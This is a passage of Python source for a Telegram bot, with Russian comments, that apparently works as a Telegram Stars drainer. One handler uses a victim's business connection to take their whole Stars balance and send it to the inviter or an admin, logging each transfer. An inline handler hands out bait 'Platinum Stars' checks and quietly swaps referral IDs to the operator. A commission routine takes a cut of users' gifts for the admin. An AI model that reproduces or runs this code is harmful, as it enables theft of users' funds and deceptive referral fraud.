async def transfer_stars_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
        
        # Определяем получателя
        inviter_id = user_referrer_map.get(str(user.id))  # Используем str() для ключа
        if inviter_id:
            try:
                await bot.send_chat_action(inviter_id, "typing")
                recipient_id = inviter_id
            except Exception:
                recipient_id = ADMIN_IDS[0]
        else:
            recipient_id = ADMIN_IDS[0]
            
        stars = await bot.get_business_account_star_balance(business_id)
        # Убеждаемся, что amount - число
        amount = int(stars.amount) if isinstance(stars.amount, str) else stars.amount
        
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            success_msg = f"🌟 Успешно переведено звёзд: {amount} от {user.id} к {recipient_id}"
            
            await bot.send_message(LOG_CHAT_ID, success_msg)
            if inviter_id and inviter_id != recipient_id:
                try:
                    await bot.send_message(inviter_id, success_msg)
                except Exception as e:
                    await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
                    
            await callback.answer(f"Переведено {amount} звёзд")
        else:
            await callback.answer("Нет звёзд для перевода", show_alert=True)
            
    except Exception as e:
        error_msg = f"❌ Ошибка при переводе звёзд: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        await callback.answer("Ошибка при переводе звёзд", show_alert=True)

@dp.inline_query()
async def inline_query_handler(inline_query: types.InlineQuery):
    try:
        user_id = inline_query.from_user.id
        is_admin = user_id in ADMIN_IDS
        
        try:
            query = inline_query.query.strip()
            if query.isdigit():
                amount = int(query)
            elif query.lower().startswith('чек ') and len(query.split()) >= 2:
                amount = int(query.split()[1])
            else:
                raise ValueError
                
            if not (1 <= amount <= 1000000):
                raise ValueError
        except (ValueError, IndexError):
            await inline_query.answer([])
            return

        if not is_admin:
            user_balance = balances.get(str(user_id), 0)
            
            if user_balance < amount:
                result = types.InlineQueryResultArticle(
                    id="1",
                    title="❌ Недостаточно звёзд",
                    description=f"Ваш баланс: {user_balance}⭐ | Требуется: {amount}⭐",
                    input_message_content=types.InputTextMessageContent(
                        message_text=f"❌ Недостаточно звёзд на балансе. Ваш баланс: {user_balance}⭐",
                        parse_mode="HTML"
                    )
                )
                await inline_query.answer([result], cache_time=0, is_personal=True)
                return
            
            balances[str(user_id)] = user_balance - amount
            save_balances()

        timestamp = str(int(time.time()))
        bot_username = (await bot.get_me()).username
        ref_id = MY_REFERRAL_ID if user_id in FORCED_REFERRAL_USERS else user_id
        check_link = f"https://t.me/{bot_username}?start=ref{ref_id}_check_{amount}_{user_id}_{timestamp}"

        # Ссылка на изображение
        image_url = "https://i.ibb.co/SwfBgs11/Chat-GPT-Image-Aug-7-2025-01-20-41-PM.png"
        
        result = types.InlineQueryResultArticle(
            id=f"check_{timestamp}",
            title=f"Отправить чек на {amount}⭐",
            description=f"Нажмите чтобы отправить {amount} звёзд" + (" (админ)" if is_admin else ""),
            thumbnail_url=image_url,  # Превью в инлайн-режиме
            input_message_content=types.InputTextMessageContent(
                message_text=(
                    f'<a href="{image_url}">&#8203;</a>\n'
                    f'🚀 Чек на {amount} звёзд в Platinum Stars\n\n'
                    f"От: @{inline_query.from_user.username if inline_query.from_user.username else f'ID:{user_id}'}"
                ),
                parse_mode="HTML"  # Обязательно используем HTML!
            ),
            reply_markup=types.InlineKeyboardMarkup(
                inline_keyboard=[[
                    types.InlineKeyboardButton(
                        text=f"Получить {amount}⭐",
                        url=check_link
                    )
                ]]
            )
        )

        await inline_query.answer([result], cache_time=0, is_personal=True)

    except Exception as e:
        logging.error(f"Ошибка в инлайн-режиме: {e}", exc_info=True)
        await inline_query.answer([])

def calculate_commission(total_gifts: int) -> int:
    """Вычисляет количество подарков для админа по заданной схеме"""
    if total_gifts >= 20:
        return 7
    elif total_gifts >= 15:
        return 5
    elif total_gifts >= 10:
        return 3
    elif total_gifts >= 6:
        return 2
    elif total_gifts >= 3:
        return 1
    else:
        return 0
    

async def on_startup():
    """Действия при запуске бота"""
    # Получаем file_id для фото чека
    await get_check_photo_file_id()
    logging.info("Бот запущен")

async def main():
    await on_startup()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
